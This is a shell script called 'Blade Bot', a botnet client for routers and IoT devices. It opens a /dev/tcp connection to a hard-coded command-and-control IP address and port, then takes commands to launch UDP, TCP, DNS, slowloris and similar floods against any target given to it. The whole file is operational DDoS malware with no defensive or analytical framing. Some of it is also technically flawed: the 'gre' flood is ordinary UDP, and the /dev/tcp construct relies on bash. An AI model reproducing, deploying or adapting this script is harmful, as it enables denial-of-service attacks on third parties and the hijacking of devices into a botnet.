#!/bin/sh
# Blade Bot - Shell version for routers and IoT devices

C2_HOST="85.11.167.41"
C2_PORT="1337"

while true; do
    # Connect to C2
    exec 5<>/dev/tcp/$C2_HOST/$C2_PORT 2>/dev/null
    
    # Send architecture
    echo "busybox" >&5 2>/dev/null
    
    # Read commands
    while read -r cmd <&5 2>/dev/null; do
        case "$cmd" in
            "PING")
                echo "PONG" >&5 2>/dev/null
                ;;
            "udp"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "tcp"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "raw"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "gre"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "dns"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    echo -e "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01" | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "hex"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    echo -e "\x55\x55\x55\x55\x00\x00\x00\x01" | nc -u $IP $PORT 2>/dev/null &
                done
                ;;
            "hold"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                    sleep 10 &
                done
                ;;
            "mix"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u $IP $PORT 2>/dev/null &
                    nc $IP $PORT 2>/dev/null &
                done
                ;;
            "slowloris"*)
                set -- $cmd
                IP=$2
                PORT=$3
                TIME=$4
                end=$(( $(date +%s) + $TIME ))
                while [ $(date +%s) -lt $end ]; do
                    nc $IP $PORT 2>/dev/null &
                    sleep 5 &
                done
                ;;
            "stop")
                killall nc 2>/dev/null
                killall dd 2>/dev/null
                ;;
        esac
    done
    sleep 5
done